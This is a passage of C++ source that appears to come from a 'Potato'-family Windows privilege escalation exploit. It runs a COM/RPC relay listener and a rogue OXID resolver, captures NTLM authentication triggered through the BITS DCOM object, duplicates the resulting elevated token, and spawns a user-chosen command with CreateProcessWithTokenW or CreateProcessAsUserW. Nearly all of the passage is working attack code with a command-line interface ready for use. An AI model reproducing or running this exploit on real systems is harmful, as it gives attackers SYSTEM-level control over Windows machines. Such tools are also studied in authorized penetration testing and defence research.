			//check to see if the received packet has NTLM auth information
			processNtlmBytes(recvbuf, iResult);

			//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
			//put packet in winrpc_sendq
			rpcSendQ->push((char*)&iResult);
			rpcSendQ->push(recvbuf);

			//block and wait for a new item in our sendq
			int* len = (int*)comSendQ->wait_pop();
			sendbuf = comSendQ->wait_pop();

			//Check to see if this is a packet containing NTLM authentication information before sending
			processNtlmBytes(sendbuf, *len);

			//send the new packet sendbuf
			iSendResult = send(ClientSocket, sendbuf, *len, 0);

			if (iSendResult == SOCKET_ERROR) {
				printf("COM -> send failed with error: %d\n", WSAGetLastError());
				exit(-11);
			}

			//Sometimes Windows likes to open a new connection instead of using the current one
			//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
			newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
		}
		else if (iResult == 0) {
			//connection closing...
			printf("exit 1...\n");
			processNtlmBytes(NULL, 0);
			shutdown(ClientSocket, SD_SEND);
			WSACleanup();

			exit(-1);
		}
		else {
			if (!TEST_mode)
				printf("COM -> recv failed with error: %d\n", WSAGetLastError());

			shutdown(ClientSocket, SD_SEND);
			WSACleanup();

			exit(-1);
		}

	} while (iResult > 0);
	printf("exit...\n");
	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();

		//exit(-1);
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("Priv Lookup FALSE\n");
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("Priv Adjust FALSE\n");
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t** argv)
{
	BOOL brute = FALSE;
	memset(dummyrpc, 0, 24);
	strcpy(dcom_ip, "127.0.0.1");
	strcpy(redirect_server, "127.0.0.1");

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 't':
			++argv;
			--argc;
			processtype = argv[1];
			break;

		case 'p':
			++argv;
			--argc;
			processname = argv[1];
			break;

		case 'l':
			++argv;
			--argc;
			g_port = argv[1];
			break;

		case 'c':
			++argv;
			--argc;
			olestr = argv[1];
			break;

		case 'a':
			++argv;
			--argc;
			processargs = argv[1];
			break;

		case 's':
			++argv;
			--argc;
			
			wcstombs(dummyrpc, argv[1], wcslen(argv[1]));
			break;
		case 'm':
			++argv;
			--argc;
			memset(dcom_ip, 0, 17);
			wcstombs(dcom_ip, argv[1], wcslen(argv[1]));
			break;
		case 'o':
			++argv;
			--argc;
			memset(oxidport, 0, 10);
			wcstombs(oxidport, argv[1], wcslen(argv[1]));
			break;
		case 'h':
			usage();
			exit(100);
			break;

		case 'k':
			++argv;
			--argc;
			rpcserver = argv[1];
			break;
		case 'n':
			++argv;
			--argc;
			--argc;
			rpcport = argv[1];
			break;

		case 'z':
			TEST_mode = TRUE;
			break;
		case 'x':
			++argv;
			--argc;
			memset(redirect_server, 0, 17);
			wcstombs(redirect_server, argv[1], wcslen(argv[1]));
			break;
		default:
			printf("Wrong Argument: %s\n", argv[1]);
			usage();
			exit(-1);
		}

		++argv;
		--argc;
	}

	if (g_port == NULL)
	{
		usage();
		exit(-1);
	}

	if ((processtype == NULL || processname == NULL) && !TEST_mode)
	{
		usage();
		exit(-1);
	}
	if (strlen(dummyrpc) == 0)
	{
		sprintf(dummyrpc,"127.0.0.1[%S]", g_port);
	}

	// Fallback to default BITS CLSID
	if (olestr == NULL)
	olestr = (wchar_t*)L"{4991d34b-80a1-4291-83b6-3328366b9097}";

	exit(Juicy(NULL, FALSE));
}
DWORD WINAPI ThreadOxid(LPVOID lpParam)
{
	char myport[11];
		memset(myport, 0, 11);
		wcstombs(myport, rpcport, 10);
	RunRogueOxidResolver(myport);
	
	return 1;

}
   
int Juicy(wchar_t* clsid, BOOL brute)
{
	PotatoAPI* test = new PotatoAPI();
	DWORD threadId;
    CreateThread(NULL, 0, ThreadOxid, (LPVOID)0, 0,&threadId);
    //CreateThread(NULL, 0, ThreadDummyRPC, (LPVOID)0, 0, &threadId);
	
	
	test->startCOMListenerThread();

	if (clsid != NULL)
		olestr = clsid;

	if (!TEST_mode)
		printf("Testing %S %S\n", olestr, g_port);
		

	test->startRPCConnectionThread();
		
	test->triggerDCOM();

	BOOL result = false;

	int ret = 0;
	while (true) {

		if (test->negotiator->authResult != -1)
		{

			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			SECURITY_DESCRIPTOR sdSecurityDescriptor;
			if (!TEST_mode)
				printf("\n[+] authresult %d\n", test->negotiator->authResult);
			if (TEST_mode)
				return 1;

		
			fflush(stdout);

			// Get a token for this process. 
			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken))
			{ 
				printf("[-] Error OpenProcessTokn: error code 0x%lx\n", GetLastError());

				return 0;
			}
			//enable privileges
			EnablePriv(hToken, SE_IMPERSONATE_NAME);
			EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
			PTOKEN_TYPE ptg;
			DWORD dwl = 0;
			HANDLE hProcessToken;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
				&hProcessToken);

			QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);


			//IsTokenSystem(elevated_token);
			//DumpToken(elevated_token);
			
			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			//if (!dwl)
				//printf("[-] Error getting token type: error code 0x%lx\n", GetLastError());

			HANDLE hT=NULL;
			result = DuplicateTokenEx(elevated_token,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenImpersonation,
				&hT);

			//SetThreadToken(NULL, hT);
			
			result = DuplicateTokenEx(elevated_token,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&duped_token);


			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			//if (!dwl)
			//	printf("Error getting token type: error code 0x%lx\n", GetLastError());

			DWORD SessionId;
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			SECURITY_ATTRIBUTES sa;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = (LPWSTR)L"winsta0\\default";

			DWORD sessionId = WTSGetActiveConsoleSessionId();

			fflush(stdout);
			wchar_t command[256];
			wcscpy(command, processname);

			if (processargs != NULL)
			{
				wcsncat(command, L" ", 1);
				wcsncat(command, processargs, wcslen(processargs));
			}

			if (*processtype == 't' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessWithTokenW(duped_token,
					0,
					processname,
					command,
					0,
					NULL,
					NULL,
					&si,
					&pi);

				if (!result)
				{
					printf("\n[-] CreateProcessWithTokenW Failed to create proc: %d\n", GetLastError());
				}
				else
				{
					printf("\n[+] CreateProcessWithTokenW OK\n");
					break;
				}
			}

			if (*processtype == 'u' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessAsUserW(
					elevated_token,
					processname,
					command,
					nullptr, nullptr,
					FALSE, 0, nullptr,
					L"C:\\", &si, &pi
					);

				if (!result) {
					printf("\n[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
				}
				else {
					printf("\n[+] CreateProcessAsUser OK\n");
					break;
				}
			}//end argv

			if (!result)
				break;
			else {
				printf("Waiting for auth...");
				Sleep(500);
				fflush(stdout);
			}
		}//end auth
	}
	return result;
}
